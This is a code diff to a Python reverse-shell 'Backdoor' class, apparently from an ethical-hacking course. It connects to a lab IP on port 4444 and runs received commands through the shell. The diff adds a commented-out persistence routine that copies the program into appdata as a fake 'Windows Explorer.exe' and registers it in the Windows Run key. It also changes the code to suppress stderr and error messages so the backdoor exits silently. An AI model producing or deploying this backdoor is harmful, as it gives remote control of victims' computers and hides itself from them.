@@ -7,15 +7,25 @@ import os
 import base64
 import sys
 import traceback
+import shutil
 
 
 class Backdoor:
     def __init__(self, ip, port):
+        # self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))  # actively initiates TCP server connection
 
+    # def become_persistent(self): # on windows - adds to startup apps
+    #     evil_file_location = os.environ["appdata"] + "Windows Explorer.exe"
+    #     if not os.path.exists(evil_file_location):
+    #         shutil.copyfile(sys.executable, evil_file_location)
+    #         command = 'reg add HKCV\Software\Microsoft\Windows\CurrentVersion\Run /v name /t REG_SZ /d "' + evil_file_location + '"'
+    #         subprocess.call(command, shell=True)
+
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        # DEVNULL = open(os.devnull, 'wb') for python 2.7
+        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 
     def reliable_send(self, data):
         json_data = json.dumps(str(data))
@@ -75,5 +85,6 @@ try:
     my_backdoor = Backdoor("10.0.2.15", 4444)
     my_backdoor.run()
 except Exception as e:
-    print(e)
-    print('Unable to connect')
+    # print(e)
+    # print('Unable to connect')
+    sys.exit()
